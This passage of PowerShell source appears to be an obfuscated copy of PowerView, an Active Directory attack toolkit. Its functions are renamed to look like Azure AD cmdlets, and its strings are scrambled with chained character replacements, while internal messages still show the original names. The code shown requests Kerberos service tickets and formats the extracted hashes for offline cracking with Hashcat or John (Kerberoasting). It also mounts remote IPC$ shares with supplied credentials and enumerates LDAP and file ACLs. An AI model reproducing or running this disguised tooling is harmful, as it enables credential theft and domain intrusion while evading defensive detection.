                if ($TargetIdentity -match "^[e-#d-n]+\\[e-#d-n ]+".replace('#', 'Z').replace('e', 'A').replace('d', 'a').replace('n', 'z')) {
                    $adsoutputtype = $NameTypes['DomainSimple']
                }
                else {
                    $adsoutputtype = $NameTypes['NT4']
                }
            }
            else {
                $adsoutputtype = $NameTypes[$OutputType]
            }
            $translate = New-Object -ComObject NameTranslate
            if ($PSBoundParameters['Credential']) {
                try {
                    $cred = $Credential.GetNetworkCredential()
                    get-gsgroupmemberlist $Translate 'InitEx' (
                        $ADSInitType,
                        $InitName,
                        $Cred.UserName,
                        $Cred.Domain,
                        $Cred.Password
                    )
                }
                catch {
                    Write-Verbose "[Convert-ADName] Error initializing translation for '$Identity' using alternate credentials : $_"
                }
            }
            else {
                try {
                    $null = get-gsgroupmemberlist $Translate 'Init' (
                        $ADSInitType,
                        $InitName
                    )
                }
                catch {
                    Write-Verbose "[Convert-ADName] Error initializing translation for '$Identity' : $_"
                }
            }
            
            get-azureadapplicationproxyapplication $Translate 'ChaseReferral' (0x60)
            try {
                
                $null = get-gsgroupmemberlist $Translate 'Set' (8, $TargetIdentity)
                get-gsgroupmemberlist $Translate 'Get' ($ADSOutputType)
            }
            catch [System.Management.Automation.MethodInvocationException] {
                Write-Verbose "[Convert-ADName] Error translating '$TargetIdentity' : $($_.Exception.InnerException.Message)"
            }
        }
    }
}
function get-azureadmsapplicationextensionproperty {
    [OutputType('System.Collections.Specialized.OrderedDictionary')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('UAC', 'useraccountcontrol')]
        [Int]
        $value,
        [Switch]
        $showall
    )
    BEGIN {
        
        $uacvalues = New-Object System.Collections.Specialized.OrderedDictionary
        $UACValues.Add("SCRIPT", 1)
        $UACValues.Add("iaa#h luenidst".replace('a', 'C').replace('#', 'O').replace('e', 'I').replace('d', 'B').replace('n', 'S').replace('t', 'E').replace('i', 'A').replace('s', 'L').replace('l', 'T').replace('h', 'U').replace(' ', 'N').replace('u', 'D'), 2)
        $UACValues.Add("dalts#e_etni#ets".replace('a', 'O').replace('#', 'I').replace('e', 'R').replace('d', 'H').replace('n', 'Q').replace('t', 'E').replace('i', 'U').replace('s', 'D').replace('l', 'M'), 8)
        $UACValues.Add("LOCKOUT", 16)
        $UACValues.Add(" t##ls_haiends".replace('a', 'O').replace('#', 'S').replace('e', 'R').replace('d', 'Q').replace('n', 'E').replace('t', 'A').replace('i', 'T').replace('s', 'D').replace('l', 'W').replace('h', 'N').replace(' ', 'P'), 32)
        $UACValues.Add(" t##ls_athi_adthen".replace('a', 'C').replace('#', 'S').replace('e', 'G').replace('d', 'H').replace('n', 'E').replace('t', 'A').replace('i', 'T').replace('s', 'D').replace('l', 'W').replace('h', 'N').replace(' ', 'P'), 64)
        $UACValues.Add("nuae rsnl_snds_rhl_tii#hnl".replace('a', 'C').replace('#', 'O').replace('e', 'R').replace('d', 'X').replace('n', 'E').replace('t', 'A').replace('i', 'L').replace('s', 'T').replace('l', 'D').replace('h', 'W').replace(' ', 'Y').replace('u', 'N').replace('r', 'P'), 128)
        $UACValues.Add("snul_ dli#atsn_taaedhs".replace('a', 'C').replace('#', 'I').replace('e', 'O').replace('d', 'U').replace('n', 'E').replace('t', 'A').replace('i', 'L').replace('s', 'T').replace('l', 'P').replace('h', 'N').replace(' ', 'D').replace('u', 'M'), 256)
        $UACValues.Add("saeldn_d##aist".replace('a', 'O').replace('#', 'C').replace('e', 'R').replace('d', 'A').replace('n', 'L').replace('t', 'T').replace('i', 'U').replace('s', 'N').replace('l', 'M'), 512)
        $UACValues.Add("#hstn aui#h_snlds_ieealhs".replace('a', 'O').replace('#', 'I').replace('e', 'C').replace('d', 'S').replace('n', 'R').replace('t', 'E').replace('i', 'A').replace('s', 'T').replace('l', 'U').replace('h', 'N').replace(' ', 'D').replace('u', 'M'), 2048)
        $UACValues.Add("lat#nsisea _sthns_iddah s".replace('a', 'O').replace('#', 'K').replace('e', 'I').replace('d', 'C').replace('n', 'S').replace('t', 'R').replace('i', 'A').replace('s', 'T').replace('l', 'W').replace('h', 'U').replace(' ', 'N'), 4096)
        $UACValues.Add("etdntd_sdles_iaa#lhs".replace('a', 'C').replace('#', 'O').replace('e', 'S').replace('d', 'R').replace('n', 'V').replace('t', 'E').replace('i', 'A').replace('s', 'T').replace('l', 'U').replace('h', 'N'), 8192)
        $UACValues.Add("ua s_tnh#dt_hieeladu".replace('a', 'O').replace('#', 'I').replace('e', 'S').replace('d', 'R').replace('n', 'X').replace('t', 'E').replace('i', 'A').replace('s', 'T').replace('l', 'W').replace('h', 'P').replace(' ', 'N').replace('u', 'D'), 65536)
        $UACValues.Add("hle_tadal_n##asli".replace('a', 'O').replace('#', 'C').replace('e', 'S').replace('d', 'G').replace('n', 'A').replace('t', 'L').replace('i', 'T').replace('s', 'U').replace('l', 'N').replace('h', 'M'), 131072)
        $UACValues.Add("e idsaidl_dtnh#dtl".replace('a', 'C').replace('#', 'I').replace('e', 'S').replace('d', 'R').replace('n', 'Q').replace('t', 'E').replace('i', 'A').replace('s', 'T').replace('l', 'D').replace('h', 'U').replace(' ', 'M'), 262144)
        $UACValues.Add("hn dhir_a#n_rilitshe#u".replace('a', 'F').replace('#', 'O').replace('e', 'I').replace('d', 'S').replace('n', 'R').replace('t', 'G').replace('i', 'E').replace('s', 'A').replace('l', 'L').replace('h', 'T').replace(' ', 'U').replace('u', 'N').replace('r', 'D'), 524288)
        $UACValues.Add("iat_sene#dtes".replace('a', 'O').replace('#', 'G').replace('e', 'E').replace('d', 'A').replace('n', 'L').replace('t', 'T').replace('i', 'N').replace('s', 'D'), 1048576)
        $UACValues.Add("ied_lde_#dn_astn".replace('a', 'O').replace('#', 'K').replace('e', 'S').replace('d', 'E').replace('n', 'Y').replace('t', 'L').replace('i', 'U').replace('s', 'N').replace('l', 'D'), 2097152)
        $UACValues.Add(" ahs_#tn_l#tiesd".replace('a', 'O').replace('#', 'R').replace('e', 'U').replace('d', 'H').replace('n', 'Q').replace('t', 'E').replace('i', 'A').replace('s', 'T').replace('l', 'P').replace('h', 'N').replace(' ', 'D'), 4194304)
        $UACValues.Add("hieelads_tnh#dts".replace('a', 'O').replace('#', 'I').replace('e', 'S').replace('d', 'R').replace('n', 'X').replace('t', 'E').replace('i', 'A').replace('s', 'D').replace('l', 'W').replace('h', 'P'), 8388608)
        $UACValues.Add(" nud so_ #_lu i_a#n_oshstl e#r".replace('a', 'F').replace('#', 'O').replace('e', 'I').replace('d', 'S').replace('n', 'R').replace('t', 'G').replace('i', 'H').replace('s', 'E').replace('l', 'A').replace('h', 'L').replace(' ', 'T').replace('u', 'U').replace('r', 'N').replace('o', 'D'), 16777216)
        $UACValues.Add("uinl#is_dtantld_iaaeh l".replace('a', 'C').replace('#', 'I').replace('e', 'O').replace('d', 'S').replace('n', 'R').replace('t', 'E').replace('i', 'A').replace('s', 'L').replace('l', 'T').replace('h', 'U').replace(' ', 'N').replace('u', 'P'), 67108864)
    }
    PROCESS {
        $resultuacvalues = New-Object System.Collections.Specialized.OrderedDictionary
        if ($ShowAll) {
            ForEach ($UACValue in $UACValues.GetEnumerator()) {
                if ( ($Value -band $UACValue.Value) -eq $UACValue.Value) {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)+")
                }
                else {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)")
                }
            }
        }
        else {
            ForEach ($UACValue in $UACValues.GetEnumerator()) {
                if ( ($Value -band $UACValue.Value) -eq $UACValue.Value) {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)")
                }
            }
        }
        $ResultUACValues
    }
}
function add-azureadserviceprincipalowner {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $credential = [Management.Automation.PSCredential]::Empty
    )
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    try {
        if ($PSBoundParameters['Domain'] -or ($Identity -match '.+\\.+')) {
            if ($Identity -match '.+\\.+') {
                
                $convertedidentity = $Identity | set-azureadapplicationproxyapplicationconnectorgroup -OutputType Canonical
                if ($ConvertedIdentity) {
                    $connecttarget = $ConvertedIdentity.SubString(0, $ConvertedIdentity.IndexOf('/'))
                    $objectidentity = $Identity.Split('\')[1]
                    Write-Verbose "[Get-PrincipalContext] Binding to domain '$ConnectTarget'"
                }
            }
            else {
                $objectidentity = $Identity
                Write-Verbose "[Get-PrincipalContext] Binding to domain '$Domain'"
                $connecttarget = $Domain
            }
            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[Get-PrincipalContext] Using alternate credentials'
                $context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $ConnectTarget, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                $context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $ConnectTarget)
            }
        }
        else {
            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[Get-PrincipalContext] Using alternate credentials'
                $domainname = select-azureadgroupidsuserismemberof | Select-Object -ExpandProperty Name
                $context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $DomainName, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                $context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
            }
            $objectidentity = $Identity
        }
        $out = New-Object PSObject
        $Out | Add-Member Noteproperty 'Context' $Context
        $Out | Add-Member Noteproperty 'Identity' $ObjectIdentity
        $Out
    }
    catch {
        Write-Warning "[Get-PrincipalContext] Error creating binding for object ('$Identity') context : $_"
    }
}
function get-azureaduserextension {
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $computername,
        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $path,
        [Parameter(Mandatory = $True)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $credential
    )
    BEGIN {
        $netresourceinstance = [Activator]::CreateInstance($NETRESOURCEW)
        $NetResourceInstance.dwType = 1
    }
    PROCESS {
        $paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($TargetComputerName in $ComputerName) {
                $targetcomputername = $TargetComputerName.Trim('\')
                $Paths += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }
        ForEach ($TargetPath in $Paths) {
            $NetResourceInstance.lpRemoteName = $TargetPath
            Write-Verbose "[Add-RemoteConnection] Attempting to mount: $TargetPath"
            
            
            $result = $Mpr::WNetAddConnection2W($NetResourceInstance, $Credential.GetNetworkCredential().Password, $Credential.UserName, 4)
            if ($Result -eq 0) {
                Write-Verbose "$TargetPath successfully mounted"
            }
            else {
                Throw "[Add-RemoteConnection] error mounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message)"
            }
        }
    }
}
function get-azureaddirectoryroletemplate {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $computername,
        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $path
    )
    PROCESS {
        $paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($TargetComputerName in $ComputerName) {
                $targetcomputername = $TargetComputerName.Trim('\')
                $Paths += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }
        ForEach ($TargetPath in $Paths) {
            Write-Verbose "[Remove-RemoteConnection] Attempting to unmount: $TargetPath"
            $result = $Mpr::WNetCancelConnection2($TargetPath, 0, $True)
            if ($Result -eq 0) {
                Write-Verbose "$TargetPath successfully ummounted"
            }
            else {
                Throw "[Remove-RemoteConnection] error unmounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message)"
            }
        }
    }
}
function remove-azureadgroupowner {
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $spn,
        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $user,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $outputformat = 'Hashcat',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
        if ($PSBoundParameters['Credential']) {
            $logontoken = Invoke-UserImpersonation -Credential $Credential
        }
    }
    PROCESS {
        if ($PSBoundParameters['User']) {
            $targetobject = $User
        }
        else {
            $targetobject = $SPN
        }
        ForEach ($Object in $TargetObject) {
            if ($PSBoundParameters['User']) {
                $userspn = $Object.ServicePrincipalName
                $samaccountname = $Object.SamAccountName
                $distinguishedname = $Object.DistinguishedName
            }
            else {
                $userspn = $Object
                $samaccountname = 'UNKNOWN'
                $distinguishedname = 'UNKNOWN'
            }
            
            if ($UserSPN -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $userspn = $UserSPN[0]
            }
            try {
                $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
            }
            catch {
                Write-Warning "[Get-DomainSPNTicket] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName' : $_"
            }
            if ($Ticket) {
                $ticketbytestream = $Ticket.GetRequest()
            }
            if ($TicketByteStream) {
                $out = New-Object PSObject
                $tickethexstream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
                $Out | Add-Member Noteproperty 'SamAccountName' $SamAccountName
                $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName
                
                
                if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $ciphertextlen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $ciphertext = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)
                    
                    if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {
                        Write-Warning "Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                        $hash = $null
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                    } else {
                        $hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $hash = $null
                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                }
                if($Hash) {
                    
                    if ($OutputFormat -match 'John') {
                        $hashformat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($DistinguishedName -ne 'UNKNOWN') {
                            $userdomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $userdomain = 'UNKNOWN'
                        }
                        
                        $hashformat = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty 'Hash' $HashFormat
                }
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                $Out
            }
        }
    }
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}
function set-azureadmsapplicationverifiedpublisher {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FileACL')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $path,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        function new-azureadmsidentityprovider {
            
            [CmdletBinding()]
            Param(
                [Int]
                $fsr
            )
            $accessmask = @{
                [uint32]'0x80000000' = 'GenericRead'
                [uint32]'0x40000000' = 'GenericWrite'
                [uint32]'0x20000000' = 'GenericExecute'
                [uint32]'0x10000000' = 'GenericAll'
                [uint32]'0x02000000' = 'MaximumAllowed'
                [uint32]'0x01000000' = 'AccessSystemSecurity'
                [uint32]'0x00100000' = 'Synchronize'
                [uint32]'0x00080000' = 'WriteOwner'
                [uint32]'0x00040000' = 'WriteDAC'
                [uint32]'0x00020000' = 'ReadControl'
                [uint32]'0x00010000' = 'Delete'
                [uint32]'0x00000100' = 'WriteAttributes'
                [uint32]'0x00000080' = 'ReadAttributes'
                [uint32]'0x00000040' = 'DeleteChild'
                [uint32]'0x00000020' = 'Execute/Traverse'
                [uint32]'0x00000010' = 'WriteExtendedAttributes'
                [uint32]'0x00000008' = 'ReadExtendedAttributes'
                [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
                [uint32]'0x00000002' = 'WriteData/AddFile'
                [uint32]'0x00000001' = 'ReadData/ListDirectory'
            }
            $simplepermissions = @{
                [uint32]'0x1f01ff' = 'FullControl'
                [uint32]'0x0301bf' = 'Modify'
                [uint32]'0x0200a9' = 'ReadAndExecute'
                [uint32]'0x02019f' = 'ReadAndWrite'
                [uint32]'0x020089' = 'Read'
                [uint32]'0x000116' = 'Write'
            }
            $permissions = @()
            
            $Permissions += $SimplePermissions.Keys | ForEach-Object {
                              if (($FSR -band $_) -eq $_) {
                                $SimplePermissions[$_]
                                $fsr = $FSR -band (-not $_)
                              }
                            }
            
            $Permissions += $AccessMask.Keys | Where-Object { $FSR -band $_ } | ForEach-Object { $AccessMask[$_] }
            ($Permissions | Where-Object {$_}) -join ','
        }
        $convertarguments = @{}
        if ($PSBoundParameters['Credential']) { $ConvertArguments['Credential'] = $Credential }
        $mappedcomputers = @{}
    }
    PROCESS {
        ForEach ($TargetPath in $Path) {
            try {
                if (($TargetPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                    $hostcomputer = (New-Object System.Uri($TargetPath)).Host
                    if (-not $MappedComputers[$HostComputer]) {
                        
                        get-azureaduserextension -ComputerName $HostComputer -Credential $Credential
                        $MappedComputers[$HostComputer] = $True
                    }
                }
                $acl = Get-Acl -Path $TargetPath
                $ACL.GetAccessRules($True, $True, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object {
                    $sid = $_.IdentityReference.Value
                    $name = get-azureaduserregistereddevice -ObjectSID $SID @ConvertArguments
                    $out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'Path' $TargetPath
                    $Out | Add-Member Noteproperty 'FileSystemRights' (new-azureadmsidentityprovider -FSR $_.FileSystemRights.value__)
                    $Out | Add-Member Noteproperty 'IdentityReference' $Name
                    $Out | Add-Member Noteproperty 'IdentitySID' $SID
                    $Out | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.FileACL')
                    $Out
                }
            }
            catch {
                Write-Verbose "[Get-PathAcl] error: $_"
            }
        }
    }
    END {
        
        $MappedComputers.Keys | get-azureaddirectoryroletemplate
    }
}
function get-azureadcurrentsessioninfo {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $properties
    )
    $objectproperties = @{}
    $Properties.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                
                $ObjectProperties[$_] = $Properties[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $ObjectProperties[$_] = $Properties[$_][0] -as $GroupTypeEnum
            }
            elseif ($_ -eq 'samaccounttype') {
                $ObjectProperties[$_] = $Properties[$_][0] -as $SamAccountTypeEnum
            }
            elseif ($_ -eq 'objectguid') {
                
                $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $ObjectProperties[$_] = $Properties[$_][0] -as $UACEnum
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                
                $descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
                if ($Descriptor.Owner) {
                    $ObjectProperties['Owner'] = $Descriptor.Owner
                }
                if ($Descriptor.Group) {
                    $ObjectProperties['Group'] = $Descriptor.Group
                }
                if ($Descriptor.DiscretionaryAcl) {
                    $ObjectProperties['DiscretionaryAcl'] = $Descriptor.DiscretionaryAcl
                }
                if ($Descriptor.SystemAcl) {
                    $ObjectProperties['SystemAcl'] = $Descriptor.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($Properties[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $ObjectProperties[$_] = "NEVER"
                }
                else {
                    $ObjectProperties[$_] = [datetime]::fromfiletime($Properties[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                
                if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                    
                    $temp = $Properties[$_][0]
                    [Int32]$high = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64]("0a{0:a8}{1:a8}".replace('a', 'x') -f $High, $Low)))
                }
                else {
                    
                    $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
                }
            }
            elseif ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                
                $prop = $Properties[$_]
                try {
                    $temp = $Prop[$_][0]
                    [Int32]$high = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ObjectProperties[$_] = [Int64]("0a{0:a8}{1:a8}".replace('a', 'x') -f $High, $Low)
                }
                catch {
                    Write-Verbose "[Convert-LDAPProperty] error: $_"
                    $ObjectProperties[$_] = $Prop[$_]
                }
            }
            elseif ($Properties[$_].count -eq 1) {
                $ObjectProperties[$_] = $Properties[$_][0]
            }
            else {
                $ObjectProperties[$_] = $Properties[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $ObjectProperties
    }
    catch {
        Write-Warning "[Convert-LDAPProperty] Error parsing LDAP properties : $_"
    }
}
function set-azureaddevice {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $ldapfilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $searchbase,
        [ValidateNotNullOrEmpty()]
        [String]
        $searchbaseprefix,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $searchscope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $resultpagesize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $servertimelimit = 120,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $securitymasks,
        [Switch]
        $tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $targetdomain = $Domain
            if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
                
                $userdomain = $ENV:USERDNSDOMAIN
                if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $UserDomain) {
                    $bindserver = "$($ENV:LOGONSERVER -replace '\\','').$UserDomain"
                }
            }
        }
        elseif ($PSBoundParameters['Credential']) {
            
            $domainobject = select-azureadgroupidsuserismemberof -Credential $Credential
            $bindserver = ($DomainObject.PdcRoleOwner).Name
            $targetdomain = $DomainObject.Name
        }
        elseif ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
            
            $targetdomain = $ENV:USERDNSDOMAIN
            if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $TargetDomain) {
                $bindserver = "$($ENV:LOGONSERVER -replace '\\','').$TargetDomain"
            }
        }
        else {
            
            write-verbose "glu-so #rh".replace('#', 'a').replace('l', 'e').replace('s', 'd').replace('h', 'n').replace(' ', 'm').replace('u', 't').replace('r', 'i')
            $domainobject = select-azureadgroupidsuserismemberof
            $bindserver = ($DomainObject.PdcRoleOwner).Name
            $targetdomain = $DomainObject.Name
        }
        if ($PSBoundParameters['Server']) {
            
            $bindserver = $Server
        }
        $searchstring = 'LDAP://'
        if ($BindServer -and ($BindServer.Trim() -ne '')) {
            $SearchString += $BindServer
            if ($TargetDomain) {
                $SearchString += '/'
            }
        }
        if ($PSBoundParameters['SearchBasePrefix']) {
            $SearchString += $SearchBasePrefix + ','
        }
        if ($PSBoundParameters['SearchBase']) {
            if ($SearchBase -Match '^GC://') {
                
                $dn = $SearchBase.ToUpper().Trim('/')
                $searchstring = ''
            }
            else {
                if ($SearchBase -match '^LDAP://') {
                    if ($SearchBase -match "ed#a://.+/.+".replace('a', 'P').replace('#', 'A').replace('e', 'L').replace('d', 'D')) {
                        $searchstring = ''
                        $dn = $SearchBase
                    }
                    else {
                        $dn = $SearchBase.SubString(7)
                    }
                }
                else {
                    $dn = $SearchBase
                }
            }
        }
        else {
            
            if ($TargetDomain -and ($TargetDomain.Trim() -ne '')) {
                $dn = "DC=$($TargetDomain.Replace('.', ',DC='))"
            }
        }
        $SearchString += $DN
        Write-Verbose "[Get-DomainSearcher] search base: $SearchString"
        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[ et-Do#aunSearcher] Usung alternate credentuals for LDAP connectuon".replace('#', 'm').replace(' ', 'G').replace('u', 'i')
            
            $domainobject = New-Object DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            $searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
        }
        else {
            
            $searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
        }
        $Searcher.PageSize = $ResultPageSize
        $Searcher.SearchScope = $SearchScope
        $Searcher.CacheResults = $False
        $Searcher.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All
        if ($PSBoundParameters['ServerTimeLimit']) {
            $Searcher.ServerTimeLimit = $ServerTimeLimit
        }
        if ($PSBoundParameters['Tombstone']) {
            $Searcher.Tombstone = $True
        }
        if ($PSBoundParameters['LDAPFilter']) {
            $Searcher.filter = $LDAPFilter
        }
        if ($PSBoundParameters['SecurityMasks']) {
            $Searcher.SecurityMasks = Switch ($SecurityMasks) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
